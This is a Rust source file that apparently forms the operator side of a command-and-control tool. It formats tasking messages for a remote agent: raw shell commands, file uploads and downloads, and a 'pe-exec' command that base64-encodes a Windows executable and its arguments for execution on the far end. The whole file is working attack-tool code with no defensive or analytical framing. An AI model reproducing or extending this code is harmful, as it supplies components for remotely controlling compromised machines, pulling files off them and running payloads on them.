use base64::{engine::general_purpose::STANDARD, Engine as _};
use std::fs;
use std::path::Path;

pub struct CommandFormatter;

impl CommandFormatter {
    pub fn format_command(input: &str) -> Result<String, String> {
        let trimmed = input.trim();

        if trimmed.starts_with("/upload ") {
            Self::format_upload(trimmed)
        } else if trimmed.starts_with("/download ") {
            Self::format_download(trimmed)
        } else if trimmed.starts_with("/pe-exec ") {
            Self::format_pe_exec(trimmed)
        } else {
            Self::format_cmd(trimmed)
        }
    }

    fn format_cmd(cmd: &str) -> Result<String, String> {
        Ok(format!("'cmd':'{}'", cmd))
    }

    fn format_download(input: &str) -> Result<String, String> {
        let filename = input
            .strip_prefix("/download ")
            .ok_or("Invalid download command format")?
            .trim();

        if filename.is_empty() {
            return Err("No filename specified for download".to_string());
        }

        Ok(format!("'download':'{}'", filename))
    }

    fn format_upload(input: &str) -> Result<String, String> {
        let filepath = input
            .strip_prefix("/upload ")
            .ok_or("Invalid upload command format")?
            .trim();

        if filepath.is_empty() {
            return Err("No file specified for upload".to_string());
        }

        let path = Path::new(filepath);
        if !path.exists() {
            return Err(format!("File not found: {}", filepath));
        }

        let file_content = fs::read(filepath).map_err(|e| format!("Failed to read file: {}", e))?;

        let content_b64 = STANDARD.encode(&file_content);

        let filename = path
            .file_name()
            .and_then(|n| n.to_str())
            .ok_or("Invalid filename")?;

        let json_data = format!("{{'filename':'{}','content':'{}'}}", filename, content_b64);

        let json_b64 = STANDARD.encode(json_data.as_bytes());

        Ok(format!("'upload':'{}'", json_b64))
    }

    fn format_pe_exec(input: &str) -> Result<String, String> {
        let rest = input
            .strip_prefix("/pe-exec ")
            .ok_or("Invalid pe-exec command format")?
            .trim();

        if rest.is_empty() {
            return Err("No executable specified for pe-exec".to_string());
        }

        let parts: Vec<&str> = rest.splitn(2, ' ').collect();
        let pe_path = parts[0];

        let path = Path::new(pe_path);
        if !path.exists() {
            return Err(format!("Executable not found: {}", pe_path));
        }

        let pe_content =
            fs::read(pe_path).map_err(|e| format!("Failed to read executable: {}", e))?;

        if pe_content.len() < 2 || &pe_content[0..2] != b"MZ" {
            return Err(format!(
                "File '{}' is not a valid PE executable (missing MZ signature)",
                pe_path
            ));
        }

        let filename = path
            .file_name()
            .and_then(|n| n.to_str())
            .ok_or("Invalid PE filename")?;

        log::info!(
            "[+] PE-exec validated | file='{}' | size={} bytes",
            filename,
            pe_content.len()
        );

        Ok(format!("'pe-exec':'{}'", filename))
    }

    pub fn prepare_pe_exec_data(input: &str) -> Result<String, String> {
        let rest = input
            .strip_prefix("/pe-exec ")
            .ok_or("Invalid pe-exec command format")?
            .trim();

        if rest.is_empty() {
            return Err("No executable specified for pe-exec".to_string());
        }

        let parts: Vec<&str> = rest.splitn(2, ' ').collect();
        let pe_path = parts[0];
        let args = if parts.len() > 1 { parts[1] } else { "" };

        log::info!(
            "[+] Preparing PE-exec data | path='{}' | args='{}'",
            pe_path,
            args
        );

        let path = Path::new(pe_path);
        let pe_content =
            fs::read(pe_path).map_err(|e| format!("Failed to read executable: {}", e))?;

        let pe_b64 = STANDARD.encode(&pe_content);

        let args_b64 = STANDARD.encode(args.as_bytes());

        let json_data = format!("{{'content':'{}','args':'{}'}}", pe_b64, args_b64);

        log::info!(
            "[+] PE-exec data prepared | pe_size={} bytes | json_size={} bytes",
            pe_content.len(),
            json_data.len()
        );

        Ok(json_data)
    }
}
